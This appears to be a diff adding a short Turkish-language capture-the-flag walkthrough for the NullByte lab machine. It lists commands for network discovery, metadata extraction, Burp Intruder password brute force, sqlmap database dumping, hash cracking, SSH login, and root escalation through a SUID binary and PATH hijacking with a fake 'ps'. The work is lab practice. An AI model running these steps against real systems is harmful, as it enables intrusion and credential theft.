@@ -1,0 +1,14 @@
+NULLBYTE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.126 bulundu.
+2 - wget http://192.168.2.126/main.gif
+3 - exiftool main.gif
+4 - http://192.168.2.126/kzMb5nVYJw/
+5 - Burp Suite -> Intruder -> Sniper -> rockyou.txt, 
+6 - sqlmap -u http://192.168.2.126/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs
+7 - sqlmap -u http://192.168.2.126/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --dump-all
+8 - ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE, https://hashes.com/en/decrypt/hash, ramses:omega
+9 - ssh -p 777 ramses@192.168.2.126
+10 - find / -perm -u=s -type f 2>/dev/null
+11 - cd /var/www/backup, echo "/bin/sh" > ps, export PATH=.:$PATH, ./procwatch
+12 - whoami
+
